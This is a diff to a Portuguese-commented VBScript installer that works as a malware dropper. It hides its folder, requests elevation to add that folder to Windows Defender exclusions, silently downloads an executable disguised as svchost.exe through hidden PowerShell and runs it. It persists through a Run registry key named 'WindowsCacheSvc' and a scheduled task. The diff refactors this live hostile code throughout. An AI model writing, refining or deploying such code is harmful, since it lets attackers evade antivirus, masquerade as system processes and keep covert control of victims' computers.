@@ -1,13 +1,26 @@
-' installer.vbs — Auto-instalador com retry via Registro do Windows.
+' installer.vbs — Verificador/instalador do svchost.exe
 '
-' Regra principal (sempre, antes de qualquer coisa):
-'   - Se já existe svchost.exe NA PASTA ou RODANDO no sistema → sai na hora.
-'     Não baixa, não move, não registra no Run, não dispara nada.
-'   - Só se NÃO existir nada é que ele faz o resto (baixa, move, roda).
+' Fluxo:
+'   1. svchost.exe existe na pasta?
+'        - NÃO → Passo 2 (instalar)
+'        - SIM → Passo 3 (checar se está rodando)
 '
-' Persistência (quando instala):
-'   - O Run ganha "WindowsCacheSvc" apontando pro installer.vbs (nunca remove).
-'   - Nunca troca pro svchost.exe.
+'   2. INSTALAR:
+'        - Pasta está na exclusão do Defender?
+'            - NÃO → pede UAC 1x, adiciona A PASTA na exclusão
+'            - SIM → pula UAC
+'        - Baixa svchost.exe, move pra pasta, roda. Fim.
+'
+'   3. JÁ EXISTE NA PASTA:
+'        - Está rodando? SIM → sai quieto.
+'        - NÃO → espera 10s (dá tempo do Run do main.py abrir)
+'              → checa de novo:
+'                  - subiu → sai quieto
+'                  - não subiu → garante pasta na exclusão (UAC se preciso)
+'                              → abre o svchost.exe → sai
+'
+' Persistência: o Run do main.py ("svchost") e o Run do VBS ("WindowsCacheSvc")
+' coexistem. O VBS nunca remove nada do Run.
 
 Option Explicit
 
@@ -17,7 +30,7 @@ Dim vbsPath, psKill, tentativasMove
 Dim regRun, regValorNome, regInstalador
 Dim psTask, taskName
 Dim pastaDefender, psExclusao, cmdElevar, psChecker
-Dim psCheckProc, regAtual
+Dim psCheckProc, regAtual, rc2
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -42,130 +55,66 @@ regInstalador = "wscript.exe //B """ & vbsPath & """"
 
 pastaDefender = destino
 
+
 ' =====================================================================
-' PASSO 0 — REGRA PRINCIPAL: já tem svchost? Então sai agora.
-' =====================================================================
-' Checa DUAS coisas:
-'   a) O arquivo svchost.exe já existe na pasta oculta?
-'   b) Algum processo svchost.exe está rodando daquele arquivo?
-'
-' Se QUALQUER uma for verdadeira → WScript.Quit 0 (sai sem fazer nada).
-'
-' Só continua se não existir nem o arquivo nem o processo.
+' Funções auxiliares
 ' =====================================================================
 
-' ---- (a) arquivo existe? ----
-If fso.FileExists(destinoExe) Then
+' Verifica se o svchost.exe (da pasta) está rodando.
+' Retorna True se está rodando, False se não.
+Function SvchostEstaRodando()
+    Dim ps
+    ps = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
+         "$alvo = '" & destinoExe & "'.ToLower(); " & _
+         "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
+         "if ($procs.Count -eq 0) { exit 1 }; " & _
+         "$achou = $false; $semPath = $false; " & _
+         "foreach ($p in $procs) { " & _
+         "  try { " & _
+         "    $exe = $p.Path; " & _
+         "    if (-not $exe) { $semPath = $true; continue } " & _
+         "    if ($exe.ToLower() -eq $alvo) { $achou = $true; break } " & _
+         "  } catch { $semPath = $true } " & _
+         "}; " & _
+         "if ($achou) { exit 0 }; " & _
+         "if ($semPath) { exit 0 }; " & _
+         "exit 1" & _
+         """"
+
+    Dim r
+    r = 1
     On Error Resume Next
-    tamArquivo = 0
-    tamArquivo = fso.GetFile(destinoExe).Size
+    r = shell.Run(ps, 0, True)
     On Error Goto 0
 
-    If tamArquivo >= 1048576 Then
-        ' Arquivo existe e tem tamanho ok. Antes de sair, garante que ele
-        ' está no Run apontando pro VBS (pra auto-recuperação continuar).
-        On Error Resume Next
-        shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
-        On Error Goto 0
+    SvchostEstaRodando = (r = 0)
+End Function
 
-        ' Confere se está rodando. Se NÃO estiver, dispara ele antes de sair.
-        psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
-                      "$alvo = '" & destinoExe & "'.ToLower(); " & _
-                      "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
-                      "if ($procs.Count -eq 0) { exit 1 }; " & _
-                      "$achou = $false; $semPath = $false; " & _
-                      "foreach ($p in $procs) { " & _
-                      "  try { " & _
-                      "    $exe = $p.Path; " & _
-                      "    if (-not $exe) { $semPath = $true; continue } " & _
-                      "    if ($exe.ToLower() -eq $alvo) { $achou = $true; break } " & _
-                      "  } catch { $semPath = $true } " & _
-                      "}; " & _
-                      "if ($achou) { exit 0 }; " & _
-                      "if ($semPath) { exit 0 }; " & _
-                      "exit 1" & _
-                      """"
+' Verifica se a PASTA já está na exclusão do Defender.
+' Retorna True se está excluída, False se não.
+Function PastaEstaExcluida()
+    Dim ps, r
+    ps = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
+         "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
+         "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
+         "$achou = $false; " & _
+         "foreach ($e in $excl) { " & _
+         "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
+         "}; " & _
+         "if ($achou) { exit 0 } else { exit 1 }" & _
+         """"
 
-        rc = 1
-        On Error Resume Next
-        rc = shell.Run(psCheckProc, 0, True)
-        On Error Goto 0
-
-        If rc <> 0 Then
-            ' Arquivo existe mas não está rodando → só dispara, sem baixar.
-            On Error Resume Next
-            shell.Run """" & destinoExe & """", 0, False
-            On Error Goto 0
-        End If
-
-        ' Sai — não baixa nada.
-        WScript.Quit 0
-    End If
-End If
-
-' ---- (b) algum svchost rodando de qualquer lugar? ----
-' Se por acaso a pasta não tem o arquivo, mas existe um processo
-' svchost.exe rodando de outro canto (ex: realocado), também não faz nada.
-psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
-              "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
-              "if ($procs.Count -gt 0) { exit 0 } else { exit 1 }" & _
-              """"
-
-rc = 1
-On Error Resume Next
-rc = shell.Run(psCheckProc, 0, True)
-On Error Goto 0
-
-If rc = 0 Then
-    ' Existe svchost.exe rodando em algum lugar → sai sem instalar nada.
-    WScript.Quit 0
-End If
-
-' =====================================================================
-' A PARTIR DAQUI: não existe svchost.exe (nem arquivo nem processo).
-' Fluxo de instalação normal.
-' =====================================================================
-
-' =====================================================================
-' PASSO 1 — Garante a entrada no Run (VBS) e cria a pasta
-' =====================================================================
-regAtual = ""
-On Error Resume Next
-regAtual = shell.RegRead(regRun & "\" & regValorNome)
-On Error Goto 0
-
-If regAtual <> regInstalador Then
+    r = 1
     On Error Resume Next
-    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
+    r = shell.Run(ps, 0, True)
     On Error Goto 0
-End If
 
-On Error Resume Next
-If Not fso.FolderExists(destino) Then
-    fso.CreateFolder(destino)
-End If
-shell.Run "attrib +h +s """ & destino & """", 0, True
-On Error Goto 0
+    PastaEstaExcluida = (r = 0)
+End Function
 
-' =====================================================================
-' PASSO 2 — Exclusão no Windows Defender (UAC só na 1ª vez)
-' =====================================================================
-psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
-            "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
-            "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
-            "$achou = $false; " & _
-            "foreach ($e in $excl) { " & _
-            "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
-            "}; " & _
-            "if ($achou) { exit 0 } else { exit 1 }" & _
-            """"
-
-rc = 1
-On Error Resume Next
-rc = shell.Run(psChecker, 0, True)
-On Error Goto 0
-
-If rc <> 0 Then
+' Pede UAC e adiciona a PASTA na exclusão do Defender.
+' Não adiciona o processo svchost.exe — só a pasta.
+Sub AdicionarPastaNaExclusao()
     psExclusao = "$p = '" & pastaDefender & "'; " & _
                  "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue"
     psExclusao = Replace(psExclusao, "'", "''")
@@ -178,11 +127,78 @@ If rc <> 0 Then
     On Error Resume Next
     shell.Run cmdElevar, 0, True
     On Error Goto 0
-End If
+End Sub
+
 
 ' =====================================================================
-' PASSO 3 — Baixa svchost.exe do GitHub
+' PASSO 1 — svchost.exe existe na pasta?
 ' =====================================================================
+
+Dim arquivoExiste
+arquivoExiste = False
+tamArquivo = 0
+
+If fso.FileExists(destinoExe) Then
+    On Error Resume Next
+    tamArquivo = fso.GetFile(destinoExe).Size
+    On Error Goto 0
+    If tamArquivo >= 1048576 Then
+        arquivoExiste = True
+    End If
+End If
+
+
+If arquivoExiste Then
+    ' =================================================================
+    ' PASSO 3 — JÁ EXISTE NA PASTA. Está rodando?
+    ' =================================================================
+
+    If SvchostEstaRodando() Then
+        ' Está rodando → sai quieto.
+        WScript.Quit 0
+    End If
+
+    ' Não está rodando. Espera 10s pro Run do main.py abrir ele no boot.
+    WScript.Sleep 10000
+
+    ' Checa de novo.
+    If SvchostEstaRodando() Then
+        ' O Run do main.py abriu ele nesse meio tempo → sai quieto.
+        WScript.Quit 0
+    End If
+
+    ' Ainda não está rodando. Antes de abrir, garante a pasta na exclusão.
+    If Not PastaEstaExcluida() Then
+        AdicionarPastaNaExclusao()
+    End If
+
+    ' Abre o svchost.exe.
+    On Error Resume Next
+    shell.Run """" & destinoExe & """", 0, False
+    On Error Goto 0
+
+    WScript.Quit 0
+End If
+
+
+' =====================================================================
+' PASSO 2 — NÃO EXISTE NA PASTA. Instalar do zero.
+' =====================================================================
+
+' Cria a pasta (se não existir) e esconde.
+On Error Resume Next
+If Not fso.FolderExists(destino) Then
+    fso.CreateFolder(destino)
+End If
+shell.Run "attrib +h +s """ & destino & """", 0, True
+On Error Goto 0
+
+' Checa a exclusão da pasta. Se já está, pula o UAC.
+If Not PastaEstaExcluida() Then
+    AdicionarPastaNaExclusao()
+End If
+
+' Baixa svchost.exe do GitHub.
 cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
             "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
             "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
@@ -203,7 +219,7 @@ If fso.FileExists(tmpExe) Then
 End If
 On Error Goto 0
 
-' --- Falhou? Sai silencioso. Run já está com o VBS. ---
+' Falhou? Sai silencioso (o Run do main.py tenta de novo no próximo boot).
 If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
     On Error Resume Next
     fso.DeleteFile tmpExe, True
@@ -211,9 +227,7 @@ If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
     WScript.Quit 0
 End If
 
-' =====================================================================
-' PASSO 4 — Move pra destino final (com retry)
-' =====================================================================
+' Move pra pasta final (com retry).
 tentativasMove = 0
 Do While tentativasMove < 30
     On Error Resume Next
@@ -233,16 +247,12 @@ If tentativasMove >= 30 Then
     WScript.Quit 0
 End If
 
-' =====================================================================
-' PASSO 5 — Roda o agente
-' =====================================================================
+' Roda o agente (o main.py já vai se auto-registrar no Run).
 On Error Resume Next
 shell.Run """" & destinoExe & """", 0, False
 On Error Goto 0
 
-' =====================================================================
-' PASSO 6 — Tarefa Agendada como backup (opcional)
-' =====================================================================
+' Registra Tarefa Agendada como backup (opcional).
 psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
          "$nome = '" & taskName & "'; " & _
          "$exe  = '" & destinoExe & "'; " & _
@@ -257,8 +267,4 @@ On Error Resume Next
 shell.Run psTask, 0, True
 On Error Goto 0
 
-' =====================================================================
-' PASSO 7 — Auto-deleta o .vbs (COMENTADO = auto-recuperação)
-' =====================================================================
-' Como está comentado, o VBS fica no disco e roda a cada logon.
-' shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
+WScript.Quit 0
